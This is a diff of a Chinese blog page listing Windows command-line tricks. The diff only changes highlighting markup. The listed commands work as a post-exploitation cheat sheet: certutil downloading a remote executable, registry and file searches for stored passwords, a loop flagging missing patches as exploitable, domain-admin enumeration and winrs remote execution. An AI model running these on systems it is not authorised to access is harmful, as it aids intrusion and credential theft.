@@ -104,38 +104,38 @@ var _hmt = _hmt || [];
   <div class="content">
     <h4>介绍</h4>
 <p>由于长期工作在Linux环境下，企业内网也基本是Linux的，对Windows有点生疏，所以决定记录总结一下Windows的相关常用命令，多面发展</p>
-<div class="highlight"><pre><span></span>https://blog.csdn.net/mfkpie/article/details/48005847
+<div class="highlight"><pre><span></span><code>https://blog.csdn.net/mfkpie/article/details/48005847
 https://blog.csdn.net/qq_45174221/article/details/104979705
 http://t3ngyu.leanote.com/post/LM-WinRM-WinRS
 https://blog.csdn.net/qq_20307987/article/details/85087960
-</pre></div>
-<div class="highlight"><pre><span></span>certutil-----从远程url下载文件
-案例:certutil -urlcache  -split  -f http://baidu.com/test.exe
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>certutil-----从远程url下载文件
+案例:certutil<span class="w"> </span>-urlcache<span class="w">  </span>-split<span class="w">  </span>-f<span class="w"> </span>http://baidu.com/test.exe
 
 findstr-----查找文件后缀结果
-findstr /s /i <span class="s2">"pass"</span> *.py*
+findstr<span class="w"> </span>/s<span class="w"> </span>/i<span class="w"> </span><span class="s2">"pass"</span><span class="w"> </span>*.py*
 
-reg query HKLM /f password /t REG_SZ /s-----搜集注册表中的各种密码数据
+reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s-----搜集注册表中的各种密码数据
 
 查看有没有开启远程链接，运行下面命令：
-REG QUERY <span class="s2">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections
+REG<span class="w"> </span>QUERY<span class="w"> </span><span class="s2">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span><span class="w"> </span>/v<span class="w"> </span>fDenyTSConnections
 结果：1表示关闭，0表示开启
 
 快速查找未打补丁的exp
-systeminfo&gt;bzhack.txt<span class="p">&amp;</span><span class="o">(</span><span class="k">for</span> %i in <span class="o">(</span> KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 <span class="o">)</span> <span class="k">do</span> @type bzhack.txt<span class="p">|</span>@find /i <span class="s2">"%i"</span><span class="o">||</span> @echo %i you can exp<span class="o">)</span><span class="p">&amp;</span>del /f /q /a bzhack.txt
+systeminfo&gt;bzhack.txt<span class="p">&amp;</span><span class="o">(</span><span class="k">for</span><span class="w"> </span>%i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">(</span><span class="w"> </span>KB977165<span class="w"> </span>KB2160329<span class="w"> </span>KB2503665<span class="w"> </span>KB2592799<span class="w"> </span>KB2707511<span class="w"> </span>KB2829361<span class="w"> </span>KB2850851<span class="w"> </span>KB3000061<span class="w"> </span>KB3045171<span class="w"> </span>KB3077657<span class="w"> </span>KB3079904<span class="w"> </span>KB3134228<span class="w"> </span>KB3143141<span class="w"> </span>KB3141780<span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>@type<span class="w"> </span>bzhack.txt<span class="p">|</span>@find<span class="w"> </span>/i<span class="w"> </span><span class="s2">"%i"</span><span class="o">||</span><span class="w"> </span>@echo<span class="w"> </span>%i<span class="w"> </span>you<span class="w"> </span>can<span class="w"> </span>exp<span class="o">)</span><span class="p">&amp;</span>del<span class="w"> </span>/f<span class="w"> </span>/q<span class="w"> </span>/a<span class="w"> </span>bzhack.txt
 
 
 
-md     建文件夹
-rd     删除文件夹
-tree    显示文件夹结构
-dir     显示磁盘目录内容
-copy    复制文件
-Xcopy   copy加强版，复制文件夹
-del     删除文件
-ren     <span class="o">[</span>原文件/夹名<span class="o">][</span>新文件/夹名<span class="o">]</span>修改文件名
-<span class="nb">type</span>    查看文本内容
-dir /a /s /b d:<span class="se">\"</span>*.conf<span class="s2">"        搜索d盘里conf结尾的文件</span>
+md<span class="w">     </span>建文件夹
+rd<span class="w">     </span>删除文件夹
+tree<span class="w">    </span>显示文件夹结构
+dir<span class="w">     </span>显示磁盘目录内容
+copy<span class="w">    </span>复制文件
+Xcopy<span class="w">   </span>copy加强版，复制文件夹
+del<span class="w">     </span>删除文件
+ren<span class="w">     </span><span class="o">[</span>原文件/夹名<span class="o">][</span>新文件/夹名<span class="o">]</span>修改文件名
+<span class="nb">type</span><span class="w">    </span>查看文本内容
+dir<span class="w"> </span>/a<span class="w"> </span>/s<span class="w"> </span>/b<span class="w"> </span>d:<span class="se">\"</span>*.conf<span class="s2">"        搜索d盘里conf结尾的文件</span>
 <span class="s2">edit        文本编辑</span>
 <span class="s2">type        显示文件内容</span>
 
@@ -159,7 +159,7 @@ dir /a /s /b d:<span class="se">\"</span>*.conf<span class="s2">"        搜索d
 <span class="s2">net user /domain 查看域内有哪些用户，Windows NT Workstation 计算机上可用，由此可以此判断用户是否是域成员。</span>
 <span class="s2">net user 用户名 /domain 查看账户信息</span>
 <span class="s2">net group /domain 查看域中的组</span>
-<span class="s2">net group "</span>domain admins<span class="s2">" /domain 查看当前域的管理用户</span>
+<span class="s2">net group "</span>domain<span class="w"> </span>admins<span class="s2">" /domain 查看当前域的管理用户</span>
 <span class="s2">query user 查看当前在线的用户</span>
 <span class="s2">net localgroup 查看所有的本地组</span>
 <span class="s2">net localgroup administrators 查看administrators组中有哪些用户</span>
@@ -231,7 +231,7 @@ dir /a /s /b d:<span class="se">\"</span>*.conf<span class="s2">"        搜索d
 <span class="s2">winrs -r:myserver -env:PATH=^%PATH^%;c:\tools -env:TEMP=d:\temp config.cmd</span>
 <span class="s2">winrs -r:myserver netdom join myserver /domain:testdomain /userd:johns /passwordd:</span>$<span class="s2">%fgh789</span>
 <span class="s2">winrs -r:myserver -ad -u:administrator -p:</span>$<span class="s2">%fgh7 dir \\anotherserver\share</span>
-</pre></div>
+</code></pre></div>
   </div>
 </article>
 <div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
